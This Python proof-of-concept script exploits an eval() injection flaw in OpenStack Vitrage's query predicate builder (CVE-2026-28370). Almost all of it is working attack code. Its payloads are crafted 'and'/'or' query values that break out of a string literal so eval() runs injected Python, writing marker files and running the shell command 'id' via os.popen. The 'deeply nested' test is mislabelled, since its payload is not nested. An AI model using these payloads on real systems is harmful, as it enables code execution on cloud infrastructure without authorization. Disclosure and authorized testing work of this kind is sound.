#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenStack Vitrage eval() Injection — Logical Operators
# CVE            : CVE-2026-28370
# Vendor         : OpenStack
# Product        : Vitrage
# Affected       : All versions before 12.0.1, 13.0.0, 14.0.0, 15.0.0
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.1 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28370 Vector 3: Injection via Logical Operator Compound Queries

Demonstrates that the eval() injection works through compound/nested
queries using 'and'/'or' logical operators — the typical real-world
Vitrage query format.

ATTACK CHAIN:
  1. Craft compound query (and/or) with injection in sub-expression
  2. create_predicate() recursively builds expression and passes to eval()
  3. Injected code executes when predicate is invoked on a vertex

PREREQUISITES:
  - OpenStack Vitrage < 12.0.1 (or 13.0.0, 14.0.0, 15.0.0)
  - Authenticated access to Vitrage API (or direct function access)

REFERENCES:
  - CVE-2026-28370
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28370
"""

import sys
import os
import json

# ============================================================================
# Color output helpers
# ============================================================================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def info(msg):
    print(f"{CYAN}[*]{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[-]{RESET} {msg}")

def warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")


class FakeVertexMatching:
    """Fake vertex that returns matching values for benign query parts.

    Used with 'and' queries: first condition is True, so Python evaluates
    the second (malicious) condition too.
    """
    def get(self, key):
        return {"CATEGORY": "ALARM", "SEVERITY": "CRITICAL"}.get(key, "")


class FakeVertexNonMatching:
    """Fake vertex that returns NON-matching values for benign query parts.

    Used with 'or' queries: first condition is False, so Python must
    evaluate the second (malicious) condition due to short-circuit behavior.
    Note: Python's 'or' only evaluates the RHS if the LHS is False/falsy.
    """
    def get(self, key):
        return "NONMATCHING_VALUE"


def main():
    print(f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════════════╗
║   CVE-2026-28370 Vector 3: Logical Operator Compound Queries       ║
╚══════════════════════════════════════════════════════════════════════╝{RESET}
""")

    from vitrage.graph.query import create_predicate

    evidence_dir = "/tmp/poc_evidence"
    os.makedirs(evidence_dir, exist_ok=True)

    all_passed = True

    # ======================================================================
    # Test A: Injection inside an 'and' compound query
    #
    # This mimics a real Vitrage query where one legitimate filter is combined
    # with a malicious one. This is the most realistic attack scenario because
    # real API calls typically use compound queries.
    #
    # The 'and' array contains:
    #   1. A benign sub-expression: {"==": {"CATEGORY": "ALARM"}}
    #   2. A malicious sub-expression with injected code
    # ======================================================================
    info("Test A: Injection inside 'and' compound query")

    and_marker = os.path.join(evidence_dir, "and_injection_proof.txt")
    if os.path.exists(and_marker):
        os.remove(and_marker)

    and_payload = {
        "and": [
            {"==": {"CATEGORY": "ALARM"}},  # benign filter
            {"==": {"x": f"' + str(open('{and_marker}','w').write('AND_INJECTION')) + '"}}  # malicious
        ]
    }

    info(f"  Payload: compound AND with benign + malicious sub-expressions")
    info(f"  Note: FakeVertexMatching makes first condition True -> Python evaluates second (malicious)")

    try:
        predicate = create_predicate(and_payload)
        predicate(FakeVertexMatching())
    except Exception as e:
        warn(f"  Exception: {e}")

    if os.path.exists(and_marker):
        with open(and_marker, 'r') as f:
            content = f.read()
        success(f"  AND injection CONFIRMED! Marker: '{content}'")
    else:
        fail("  AND injection FAILED")
        all_passed = False

    # ======================================================================
    # Test B: Injection inside an 'or' compound query
    # ======================================================================
    info("Test B: Injection inside 'or' compound query")

    or_marker = os.path.join(evidence_dir, "or_injection_proof.txt")
    if os.path.exists(or_marker):
        os.remove(or_marker)

    or_payload = {
        "or": [
            {"==": {"SEVERITY": "CRITICAL"}},  # benign filter
            {"==": {"x": f"' + str(open('{or_marker}','w').write('OR_INJECTION')) + '"}}  # malicious
        ]
    }

    info(f"  Payload: compound OR with benign + malicious sub-expressions")
    info(f"  Note: FakeVertexNonMatching makes first condition False -> Python evaluates second (malicious)")
    info(f"  (Python 'or' short-circuits: if first operand is True, second is skipped)")

    try:
        predicate = create_predicate(or_payload)
        # Use FakeVertexNonMatching so the first 'or' condition is False,
        # forcing Python to evaluate the second (malicious) branch
        predicate(FakeVertexNonMatching())
    except Exception as e:
        warn(f"  Exception: {e}")

    if os.path.exists(or_marker):
        with open(or_marker, 'r') as f:
            content = f.read()
        success(f"  OR injection CONFIRMED! Marker: '{content}'")
    else:
        fail("  OR injection FAILED")
        all_passed = False

    # ======================================================================
    # Test C: Deeply nested compound query with command execution
    #
    # Demonstrates that deeply nested queries are also exploitable.
    # This is an "and" containing another "or" sub-expression.
    # ======================================================================
    info("Test C: Deeply nested compound query with command execution")

    nested_file = os.path.join(evidence_dir, "nested_injection_cmd.txt")
    if os.path.exists(nested_file):
        os.remove(nested_file)

    # For the nested case, the malicious code is inside: and[benign, or[benign, malicious]]
    # The outer 'and' needs first condition True -> use matching vertex for CATEGORY
    # The inner 'or' needs first condition False -> the SEVERITY won't match NONMATCHING
    # But we need outer and's first cond to be True...
    # Solution: Put the malicious payload FIRST in the 'or', so it always executes
    nested_payload = {
        "and": [
            {"==": {"x": (
                "' + str(open('" + nested_file + "','w').write("
                "'NESTED: ' + __import__('os').popen('id').read().strip()"
                ")) + '"
            )}},
            {"==": {"CATEGORY": "ALARM"}}
        ]
    }

    info("  Payload: and[malicious(id), benign] — malicious comes first in 'and'")
    info("  Note: 'and' always evaluates the first operand, so malicious code runs")

    try:
        predicate = create_predicate(nested_payload)
        # The malicious sub-expression is the first operand of 'and',
        # so it always gets evaluated regardless of the vertex data
        predicate(FakeVertexMatching())
    except Exception as e:
        warn(f"  Exception: {e}")

    if os.path.exists(nested_file):
        with open(nested_file, 'r') as f:
            content = f.read()
        success(f"  Nested injection CONFIRMED!")
        success(f"  Output: '{content}'")
    else:
        fail("  Nested injection FAILED")
        all_passed = False

    # ======================================================================
    # Summary
    # ======================================================================
    print(f"\n{BOLD}{'='*50}{RESET}")
    if all_passed:
        success("ALL compound query injection tests PASSED")
        success("Injection works through 'and', 'or', and nested queries")
        return 0
    else:
        warn("Some compound query injection tests FAILED")
        return 1


if __name__ == "__main__":
    sys.exit(main())
